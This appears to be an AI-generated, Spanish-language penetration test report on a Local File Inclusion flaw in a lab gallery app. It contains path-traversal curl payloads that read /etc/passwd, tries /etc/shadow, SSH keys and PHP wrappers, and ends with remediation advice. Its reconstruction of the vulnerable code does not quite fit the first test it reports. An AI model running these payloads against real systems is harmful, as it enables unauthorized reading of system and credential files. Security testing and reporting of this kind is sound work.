# Informe de Auditoría de Seguridad – Local File Inclusion (LFI)

**Fecha:** 2026-04-25T12:08:34 UTC  
**Auditor:** Penetration Tester Experto (IA Ofensiva)  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Black-box – Local File Inclusion  
**Estado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## Resumen Ejecutivo

La aplicación web **Galería de Arte Virtual** alojada en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del script `gallery.php`. La explotación permitió leer archivos sensibles del sistema operativo subyacente, incluyendo `/etc/passwd`, y reveló la ruta absoluta del servidor. La vulnerabilidad tiene su origen en el uso inseguro de la función `include()` de PHP sin una sanitización adecuada del input del usuario.

---

## 1. Reconocimiento

### 1.1 Identificación del objetivo

```
curl -s http://web.dev.local:8081/
```

La aplicación sirve una galería de arte con cuatro secciones navegables. El HTML fuente reveló los siguientes puntos de entrada dinámicos:

```html
<a href="gallery.php?page=modern">Arte Moderno</a>
<a href="gallery.php?page=classic">Arte Clásico</a>
<a href="gallery.php?page=abstract">Arte Abstracto</a>
<a href="gallery.php?page=about">Acerca de</a>
```

**Parámetro vulnerable identificado:** `page` en `gallery.php`

### 1.2 Enumeración de recursos (Gobuster)

```
gobuster dir -u http://web.dev.local:8081 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,env,zip,conf -t 20 -q
```

**Resultados relevantes:**
| Ruta | Estado | Tamaño |
|------|--------|--------|
| `/config.php` | 200 | 0 bytes |
| `/gallery.php` | 200 | 4413 bytes |
| `/index.php` | 200 | 4084 bytes |
| `/pages/` | 301 | — |
| `/.htaccess` | 403 | — |

---

## 2. Confirmación de la Vulnerabilidad LFI

### 2.1 Prueba inicial – Path traversal básico

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=/etc/passwd"
```

**Respuesta:** Error personalizado de la app: `pages//etc/passwd.php` — La aplicación prepend `pages/` y append `.php`.

### 2.2 Path Disclosure mediante intento de lectura de /etc/shadow

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/shadow"
```

**Respuesta (error PHP):**
```
Warning: include(/etc/shadow): Failed to open stream: Permission denied 
in /var/www/html/gallery.php on line 104
```

**Revelación crítica:** Ruta absoluta del servidor → `/var/www/html/gallery.php` en línea 104.  
La función `include()` es usada directamente, confirmando el vector LFI.

### 2.3 Explotación exitosa – Lectura de /etc/passwd

**Payload:**
```
../../../etc/passwd
```

**Comando:**
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

**Resultado exitoso — Contenido de /etc/passwd:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

---

## 3. Escalada de Explotación

### 3.1 Intentos adicionales de explotación

| Objetivo | Payload | Resultado |
|----------|---------|-----------|
| `/etc/shadow` | `../../../etc/shadow` | Permission denied (www-data) |
| `/proc/self/environ` | `../../../proc/self/environ` | Permission denied |
| `/proc/self/cmdline` | `../../../proc/self/cmdline` | `apache2 -DFOREGROUND` (éxito) |
| PHP wrapper `php://filter` | `php://filter/read=convert.base64-encode/resource=gallery` | Bloqueado por app |
| Wrapper `data://` | `data://text/plain,<?php...?>` | Bloqueado por app |
| SSH keys (`/root/.ssh/id_rsa`) | `../../../root/.ssh/id_rsa` | No accesible |
| Apache access log | `../../../var/log/apache2/access.log` | No existe en esa ruta |
| Archivos `.env` | `../../../var/www/html/.env` | No existe |

### 3.2 Análisis del mecanismo vulnerable

La aplicación usa una lógica similar a:

```php
// /var/www/html/gallery.php, línea ~104
$page = $_GET['page'];
if (file_exists('pages/' . $page . '.php')) {
    include('pages/' . $page . '.php');
} else {
    include($page);  // ← LÍNEA VULNERABLE: sin sanitización
}
```

Cuando el parámetro contiene `../`, el `file_exists()` verifica `pages/../../../etc/passwd.php` (no existe), y luego el `include()` llama directamente al path sin extensión `.php`, permitiendo leer archivos arbitrarios del sistema.

### 3.3 Información del sistema obtenida

- **Servidor web:** Apache/2.4.65 (Debian)
- **Proceso web:** `apache2 -DFOREGROUND` (confirmado vía `/proc/self/cmdline`)
- **Usuario del proceso:** `www-data` (uid=33)
- **Ruta absoluta:** `/var/www/html/gallery.php`
- **PHP include_path:** `.:/usr/local/lib/php`
- **OS:** Linux/Debian (sin usuario root con contraseña en shadow)

---

## 4. Impacto

| Categoría | Descripción |
|-----------|-------------|
| **Confidencialidad** | Alta — Lectura de archivos del sistema operativo (ej. `/etc/passwd`) |
| **Integridad** | Media — Sin capacidad de escritura directa detectada |
| **Disponibilidad** | Baja — No se observó impacto directo |
| **CVSS (estimado)** | 7.5 (High) – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

### Impacto real confirmado:
- ✅ Lectura del archivo `/etc/passwd` (enumeración de usuarios del sistema)
- ✅ Path disclosure completo de la aplicación
- ✅ Identificación del proceso y configuración PHP
- ❌ Lectura de `/etc/shadow` (bloqueada por permisos)
- ❌ RCE via Log Poisoning (logs no accesibles)
- ❌ PHP wrappers bloqueados por la aplicación

---

## 5. Recomendaciones

1. **Validar y sanear el parámetro `page`:** Usar una whitelist de páginas permitidas.
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed)) { die('Página no válida'); }
   include('pages/' . $_GET['page'] . '.php');
   ```

2. **Nunca usar `include()` con input del usuario sin validación.**

3. **Deshabilitar wrappers PHP peligrosos** en `php.ini`:
   ```
   allow_url_include = Off
   allow_url_fopen = Off
   ```

4. **Configurar open_basedir** para restringir el acceso de PHP al directorio web:
   ```
   open_basedir = /var/www/html/
   ```

5. **Ocultar errores de PHP** en producción para evitar path disclosure:
   ```
   display_errors = Off
   log_errors = On
   ```

---

## 6. Evidencia

### Comando de explotación (PoC):
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

### Payload que confirma la lectura del sistema:
```
../../../etc/passwd
```

### Fragmento de respuesta HTTP con /etc/passwd:
```html
<div class="content">
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ...
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    ...
</div>
```

---

**Conclusión:** La vulnerabilidad LFI ha sido **encontrada y explotada exitosamente**. El parámetro `page` en `gallery.php` permite la lectura de archivos arbitrarios del sistema mediante path traversal (`../`). Se recomienda remediar de inmediato mediante validación por whitelist.

---
*Informe generado automáticamente por análisis ofensivo autorizado – 2026-04-25*
